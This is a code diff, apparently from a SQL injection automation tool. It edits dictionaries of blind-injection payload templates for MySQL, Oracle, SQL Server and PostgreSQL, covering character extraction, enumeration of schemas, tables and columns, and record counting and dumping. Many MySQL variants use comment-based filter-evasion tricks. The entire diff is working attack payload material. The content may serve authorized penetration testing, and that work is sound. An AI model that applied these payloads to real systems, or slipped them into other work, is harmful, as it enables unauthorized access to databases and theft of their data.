@@ -53,22 +53,22 @@ DATA_EXTRACTION_PAYLOADS = {
     "MySQL": {
         "ASCII": "ORD(MID({query},{position},1))={char}",
         "ASC": "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
-        "CHAR": "MID({query},{position},1)=CHAR({char})",
+        # "CHAR": "MID({query},{position},1)=CHAR({char})",
     },
     "Oracle": {
         "ASCII": "ASCII(SUBSTRC({query},{position},1))={char}",
         "ASC": "ASCII(SUBSTRC(NVL({query},CHR(32)),{position},1))={char}",
-        "CHAR": "SUBSTR({query},{position},1)=CHR({char})",
+        # "CHAR": "SUBSTR({query},{position},1)=CHR({char})",
     },
     "Microsoft SQL Server": {
         "ASCII": "UNICODE(SUBSTRING({query},{position},1))={char}",
         "ASC": "UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}",
-        "CHAR": "SUBSTRING({query},{position},1)=CHAR({char})",
+        # "CHAR": "SUBSTRING({query},{position},1)=CHAR({char})",
     },
     "PostgreSQL": {
         "ASCII": "ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}",
         "ASC": "ASCII(SUBSTRING((COALESCE({query}::text,CHR(32)))::text FROM {position} FOR 1))={char}",
-        "CHAR": "SUBSTRING({query}::text FROM {position} FOR 1)=CHR({char})",
+        # "CHAR": "SUBSTRING({query}::text FROM {position} FOR 1)=CHR({char})",
     },
 }
 
@@ -1577,8 +1577,8 @@ PAYLOADS_DBS_NAMES = {
     "MySQL": [
         "(SELECT CONCAT(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
         "(/*!SELECT*//**_**/CONCAT/**_**/(/*!50000SCHEMA_NAME*/)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/))LIMIT 0,1",
-        "(SELECT CONCAT_WS(0x09,SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
-        "(/*!SELECT*/ CONCAT_WS(0x09,/*!SCHEMA_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/)LIMIT/**_**/0,1)",
+        "(SELECT CONCAT_WS(0x28,0x7e,SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
+        "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!SCHEMA_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/)LIMIT/**_**/0,1)",
     ],
     "PostgreSQL": [
         "(SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET 0 LIMIT 1)",
@@ -1643,8 +1643,8 @@ PAYLOADS_TBLS_NAMES = {
         "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
         "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE {db})LIMIT 0,1)",
         "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN/**_**/({db}))LIMIT 0,1)",
-        "(SELECT CONCAT_WS(0x09,TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
-        "(/*!SELECT*/ CONCAT_WS(0x09,/*!TABLE_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA={db})LIMIT/**_**/0,1)",
+        "(SELECT CONCAT_WS(0x28,0x7e,TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
+        "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!TABLE_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA={db})LIMIT/**_**/0,1)",
     ],
     "PostgreSQL": [
         "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME={db} OFFSET 0 LIMIT 1)",
@@ -1710,8 +1710,8 @@ PAYLOADS_COLS_NAMES = {
         "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
         "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl})LIMIT 0,1)",
         "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN/**_**/({db}))AND(TABLE_NAME IN({tbl}))LIMIT 0,1)",
-        "(SELECT CONCAT_WS(0x09,COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT 0,1)",
-        "(/*!SELECT*/ CONCAT_WS(0x09,/*!COLUMN_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT/**_**/0,1)",
+        "(SELECT CONCAT_WS(0x28,0x7e,COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT 0,1)",
+        "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!COLUMN_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT/**_**/0,1)",
     ],
     "PostgreSQL": [
         "(SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE {db} AND TABLE_NAME LIKE {tbl} OFFSET 0 LIMIT 1)",
@@ -1734,7 +1734,7 @@ PAYLOADS_COLS_NAMES = {
 PAYLOADS_RECS_COUNT = {
     "MySQL": [
         "(SELECT COUNT(*) FROM {db}.{tbl})",
-        # "(SELECT COUNT(*)FROM({db}.{tbl}))",
+        "(SELECT COUNT(*)FROM({db}.{tbl}))",
         # "(/*!50000SELECT*/+COUNT(/*!50000**/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/))",
         "(SELECT IFNULL(TABLE_ROWS, 0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl}))",
         "(SELECT IFNULL(TABLE_ROWS, 0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl}))",
@@ -1754,14 +1754,14 @@ PAYLOADS_RECS_COUNT = {
 
 PAYLOADS_RECS_DUMP = {
     "MySQL": [
-        "(SELECT {col} FROM {db}.{tbl} LIMIT 0,1)",
+        "(SELECT CONCAT_WS(0x28,0x7e,{col})FROM({db}.`{tbl}`)LIMIT 0,1)",
         "(SELECT CONCAT({col}) FROM {db}.{tbl} LIMIT 0,1)",
-        # "(SELECT CONCAT_WS(0x7e,{col})FROM({db}.`{tbl}`)LIMIT 0,1)",
-        # "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/+/*!50000{db}.{tbl}*/+LIMIT+0,1)",
-        # "(SELECT/**/CONCAT({col})FROM/**/{db}.{tbl}/**/LIMIT/**_**/0,1)",
-        # "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/)LIMIT/**/0,1)",
-        # "(/*!50000SELECT*/+CONCAT/**_**/({col})/*!50000FROM*/+/*!50000{db}*/./*!50000{tbl}*/+LIMIT+0,1)",
-        # "(/*!50000SELECT*//**/CONCAT({col})/*!50000FROM*//**//*!50000{db}*/./*!50000{tbl}*//**/LIMIT/**_**/0,1)",
+        "(/*!50000SELECT*/ CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/ /*!50000{db}.{tbl}*/ LIMIT 0,1)",
+        "(SELECT IFNULL({col},0x20) FROM {db}.{tbl} LIMIT 0,1)",
+        "(SELECT/**/CONCAT({col})FROM/**/{db}.{tbl}/**/LIMIT/**_**/0,1)",
+        "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/)LIMIT/**/0,1)",
+        "(/*!50000SELECT*/ CONCAT/**_**/({col})/*!50000FROM*/ /*!50000{db}*/./*!50000{tbl}*/ LIMIT 0,1)",
+        "(/*!50000SELECT*//**/CONCAT({col})/*!50000FROM*//**//*!50000{db}*/./*!50000{tbl}*//**/LIMIT/**_**/0,1)",
     ],
     "PostgreSQL": [
         "(SELECT {col}::text FROM {db}.{tbl} OFFSET 0 LIMIT 1)",
